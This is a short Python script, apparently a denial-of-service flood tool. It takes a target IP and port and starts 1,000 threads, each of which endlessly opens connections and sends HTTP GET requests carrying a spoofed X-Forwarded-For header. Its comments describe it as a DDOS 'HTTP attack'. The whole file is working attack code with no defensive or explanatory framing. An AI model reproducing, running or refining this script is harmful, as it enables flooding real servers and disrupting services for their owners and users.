import socket
import threading
import argparse
import time

def attack(target, port, fake_ip, retries=5):
    while True:
        for attempt in range(retries):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
                s.send(("Host: " + target + "\r\n").encode('ascii'))
                s.send(("X-Forwarded-For: " + fake_ip + "\r\n\r\n").encode('ascii'))
                s.close()
                break  # Exit the retry loop if successful
            except ConnectionResetError as e:
                print(f"Connection reset by peer: {e}. Retrying {retries - attempt - 1} more times...")
                time.sleep(1)  # Delay before retrying
            except Exception as e:
                print(f"An error occurred: {e}")
                break  # Exit the retry loop if another error occurs

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="To input the ip address and fake ip"
    )

    parser.add_argument(
        '-i', '--ip', metavar='Ip',
        required=True, help='Add the IP address to the code with -i'
    )
    argu = parser.parse_args()
    
    target = argu.ip  # IP address of the target
    port_num = input("Input port number: ")  # The port matters in the DDOS, 80 is used in HTTP attack
    port = int(port_num)
    fake_ip = input("Input fake IP: ")  # Fake IP stays as the header of the attack

    for i in range(1000):
        thread = threading.Thread(target=attack, args=(target, port, fake_ip))
        thread.start()
